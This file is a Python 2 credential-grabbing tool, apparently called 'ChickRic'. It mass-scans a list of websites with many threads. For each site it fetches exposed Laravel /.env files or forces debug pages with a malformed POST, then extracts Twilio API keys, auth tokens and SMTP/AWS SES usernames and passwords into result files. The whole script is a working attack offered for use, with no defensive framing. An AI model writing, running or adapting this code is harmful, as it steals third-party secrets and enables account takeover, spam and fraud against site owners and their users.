# -*- coding: utf-8 -*-
import requests, os, sys
from re import findall as reg
requests.packages.urllib3.disable_warnings()
from threading import *
from threading import Thread
from ConfigParser import ConfigParser
from Queue import Queue

try:
	os.mkdir('Results')
except:
	pass

class Worker(Thread):
    def __init__(self, tasks):
        Thread.__init__(self)
        self.tasks = tasks
        self.daemon = True
        self.start()

    def run(self):
        while True:
            func, args, kargs = self.tasks.get()
            try: func(*args, **kargs)
            except Exception, e: print e
            self.tasks.task_done()

class ThreadPool:
    def __init__(self, num_threads):
        self.tasks = Queue(num_threads)
        for _ in range(num_threads): Worker(self.tasks)

    def add_task(self, func, *args, **kargs):
        self.tasks.put((func, args, kargs))

    def wait_completion(self):
        self.tasks.join()

class ChickRic:
	def get_twillio(self, text, url):
		try:
			if "TWILIO" in text:
				if "TWILIO_ACCOUNT_SID=" in text:
					method = '/.env'
					acc_sid = reg('\nTWILIO_ACCOUNT_SID=(.*?)\n', text)[0]
					acc_key = reg('\nTWILIO_API_KEY=(.*?)\n', text)[0]
					sec = reg('\nTWILIO_API_SECRET=(.*?)\n', text)[0]
					chatid = reg('\nTWILIO_CHAT_SERVICE_SID=(.*?)\n', text)[0]
					phone = reg('\nTWILIO_NUMBER=(.*?)\n', text)[0]
					auhtoken = reg('\nTWILIO_AUTH_TOKEN=(.*?)\n', text)[0]
				elif '<td>TWILIO_ACCOUNT_SID</td>' in text:
					method = 'debug'
					acc_sid = reg('<td>TWILIO_ACCOUNT_SID<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					acc_key = reg('<td>TWILIO_API_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					sec = reg('<td>TWILIO_API_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					chatid = reg('<td>TWILIO_CHAT_SERVICE_SID<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					phone = reg('<td>TWILIO_NUMBER<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					auhtoken = reg('<td>TWILIO_AUTH_TOKEN<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
				build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nTWILIO_ACCOUNT_SID: '+str(acc_sid)+'\nTWILIO_API_KEY: '+str(acc_key)+'\nTWILIO_API_SECRET: '+str(sec)+'\nTWILIO_CHAT_SERVICE_SID: '+str(chatid)+'\nTWILIO_NUMBER: '+str(phone)+'\nTWILIO_AUTH_TOKEN: '+str(auhtoken)
				remover = str(build).replace('\r', '')
				save = open('Results/TWILLIO.txt', 'a')
				save.write(remover+'\n\n')
				save.close()
				return True
			else:
				return False
		except:
			return False

	def get_smtp(self, text, url):
		try:
			if "MAIL_HOST" in text:
				if "MAIL_HOST=" in text:
					method = '/.env'
					mailhost = reg("\nMAIL_HOST=(.*?)\n", text)[0]
					mailport = reg("\nMAIL_PORT=(.*?)\n", text)[0]
					mailuser = reg("\nMAIL_USERNAME=(.*?)\n", text)[0]
					mailpass = reg("\nMAIL_PASSWORD=(.*?)\n", text)[0]
					mailfrom = reg("\nMAIL_FROM_ADDRESS=(.*?)\n", text)[0]
				elif "<td>MAIL_HOST</td>" in text:
					method = 'debug'
					mailhost = reg('<td>MAIL_HOST<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					mailport = reg('<td>MAIL_PORT<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					mailuser = reg('<td>MAIL_USERNAME<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					mailpass = reg('<td>MAIL_PASSWORD<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					mailfrom = reg('<td>MAIL_FROM_ADDRESS<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
				if mailuser == "null" or mailpass == "null" or mailfrom == "null" or mailuser == "" or mailpass == "" or mailfrom == "":
					return False
				else:
					# mod aws
					if '.amazonaws.com' in mailhost:
						getcountry = reg('email-smtp.(.*?).amazonaws.com', mailhost)[0]
						build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nMAILHOST: '+str(mailhost)+'\nMAILPORT: '+str(mailport)+'\nMAILUSER: '+str(mailuser)+'\nMAILPASS: '+str(mailpass)+'\nMAILFROM: '+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Results/'+getcountry[:-2]+'.txt', 'a')
						save.write(remover+'\n\n')
						save.close()
					else:
						build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nMAILHOST: '+str(mailhost)+'\nMAILPORT: '+str(mailport)+'\nMAILUSER: '+str(mailuser)+'\nMAILPASS: '+str(mailpass)
						remover = str(build).replace('\r', '')
						save = open('Results/SMTP_RANDOM.txt', 'a')
						save.write(remover+'\n\n')
						save.close()
					return True
			else:
				return False
		except Exception as err:
			print(str(err))
			return False

def printf(text):
    ''.join([str(item) for item in text])
    print(text + '\n'),

def main(url):
	resp = False
	try:
		text = '\033[32;1m#\033[0m '+url
		headers = {'User-agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36'}
		get_source = requests.get(url+"/.env", headers=headers, timeout=8, verify=False, allow_redirects=False).text
		if "APP_KEY=" in get_source:
			resp = get_source
		else:
			get_source = requests.post(url, data={"0x[]":"ChickRic"}, headers=headers, timeout=8, verify=False, allow_redirects=False).text
			if "<td>APP_KEY</td>" in get_source:
				resp = get_source
		if resp:
			getsmtp = ChickRic().get_smtp(resp, url)
			getwtilio = ChickRic().get_twillio(resp, url)
			if getsmtp:
				text += ' | \033[32;1mSMTP\033[0m'
			else:
				text += ' | \033[31;1mSMTP\033[0m'
			if getwtilio:
				text += ' | \033[32;1mTWILIO\033[0m'
			else:
				text += ' | \033[31;1mTWILIO\033[0m'
	except:
		text = '\033[31;1m#\033[0m '+url
	printf(text)


if __name__ == '__main__':
    print('''
___________________Tools Grabing by ChickenFlow___________________
   _____   _       _          _      _____    _        
  / ____| | |     (_)        | |    |  __ \  (_)                    
 | |      | |__    _    ___  | | __ | |__) |  _    ___ 
 | |      | '_ \  | |  / __| | |/ / |  _  /  | |  / __|
 | |____  | | | | | | | (__  |   <  | | \ \  | | | (__ 
  \_____| |_| |_| |_|  \___| |_|\_\ |_|  \_\ |_|  \___|  
  
___________________Tools Grabing by ChickenFlow___________________   \n''')
    try:
        readcfg = ConfigParser()
        readcfg.read(pid_restore)
        lists = readcfg.get('DB', 'FILES')
        numthread = readcfg.get('DB', 'THREAD')
        sessi = readcfg.get('DB', 'SESSION')
        print("log session bot found! restore session")
        print('''Using Configuration :\n\tFILES='''+lists+'''\n\tTHREAD='''+numthread+'''\n\tSESSION='''+sessi)
        tanya = raw_input("Want to contineu session ? [Y/n] ")
        if "Y" in tanya or "y" in tanya:
            lerr = open(lists).read().split("\n"+sessi)[1]
            readsplit = lerr.splitlines()
        else:
            kntl # Send Error  :v
    except:
        try:
            lists = sys.argv[1]
            numthread = sys.argv[2]
            readsplit = open(lists).read().splitlines()
        except:
            try:
                lists = raw_input("Web List ? ")
                readsplit = open(lists).read().splitlines()
            except:
                print("Wrong input or list not found!")
                exit()
            try:
                numthread = raw_input("Threads ? ")
            except:
                print("Wrong thread number!")
                exit()
    pool = ThreadPool(int(numthread))
    for url in readsplit:
        if "://" in url:
            url = url
        else:
            url = "https://"+url
        if url.endswith('/'):
            url = url[:-1]
        jagases = url
        try:
            pool.add_task(main, url)
        except KeyboardInterrupt:
            session = open(pid_restore, 'w')
            cfgsession = "[DB]\nFILES="+lists+"\nTHREAD="+str(numthread)+"\nSESSION="+jagases+"\n"
            session.write(cfgsession)
            session.close()
            print("CTRL+C Detect, Session saved")
            exit()
    pool.wait_completion()
    try:
        os.remove(pid_restore)
    except:
        pass
